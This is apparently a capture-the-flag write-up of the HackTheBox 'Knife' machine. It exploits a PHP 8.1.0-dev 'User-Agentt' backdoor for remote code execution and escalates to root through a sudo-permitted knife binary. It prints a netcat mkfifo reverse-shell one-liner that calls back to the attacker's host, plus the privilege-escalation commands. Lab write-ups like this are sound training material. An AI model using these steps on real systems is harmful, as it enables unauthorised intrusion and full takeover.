---
title: Knife Machine HackTheBox
date: 2022-10-22 00:18:00 +0800
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

# Description

In this machine we will learn how to get a reverse shell throught a webshell

# Enumeration

First of all lets run an nmap:

```ruby
Nmap 7.93 scan initiated Tue Nov  1 14:45:26 2022 as: nmap -p22,80 -sCV -oN targeted 10.129.87.148
Nmap scan report for 10.129.87.148
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be549ca367c315c364717f6a534a4c21 (RSA)
|   256 bf8a3fd406e92e874ec97eab220ec0ee (ECDSA)
|_  256 1adea1cc37ce53bb1bfb2b0badb3f684 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  1 14:45:48 2022 -- 1 IP address (1 host up) scanned in 21.63 seconds
```
And go straight to the machine page. Unluckly, we can do nothing, since there is no interactive stuff.

>Now should be a good momment to run a whatweb (To see what tecnology is the page using and see if there is any vulnarable software)
{: .prompt-tip}

```bash
whatweb http://10.129.78.68
http://10.129.78.68 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.78.68], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```
From here we can extract PHP 8.1.0 DEV, which is vulnerable withing its version

```bash
searchsploit PHP 8.1.0-dev
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution     | php/webapps/49933.py
```

Lets get it into our local machine and run it :

```bash
searchsploit -m php/webapps/49933.py

python3 49933.py
```
>If we submit the website's address: http://machine_IP we will be in and can sumbit the user.txt flag
{: .prompt-tip}

Now, we need WE ARE IN A WEBSHELL, and we need to get a reverse shell to our local machine:

```bash
nc -lvnp 4444
and execute this command:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {Our machine IP} 4444 >/tmp/f
```

>Now we got a reverse shell, and lets turn it into an interactive one:
{: .prompt-tip}
```bash
script /dev/null -c bash
ctrl+z
stty raw -echo;fg
export TERM=xterm
```

Now we gotta do privilege escalation, so lets run sudo -l to see if we can run any file/command as sudo:

```bash
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
>We can run the knife binary, and since it is a RUBY file, we have to run it with exec:
{: .prompt-info}

```bash
sudo knife exec

james@knife:/usr/bin$ sudo knife exec
An interactive shell is opened

Type your script and do:

1. To run the script, use 'Ctrl D'
2. To exit, use 'Ctrl/Shift C'

Type here a script...
```
Now, to get user bash, we just have to type the following command and press ctrl+D:

```
Type here a script...
exec "/bin/bash"
root@knife:/usr/bin# whoami
root
root@knife:/usr/bin# cd /root
root@knife:~# ls
delete.sh  root.txt  snap
```
>NOW WE CAN SUBMIT ROOT FLAG! CONGRATULATIONS, YOU MADE IT TILL THE END!!!  KEEP IT UP
{: .prompt-danger}
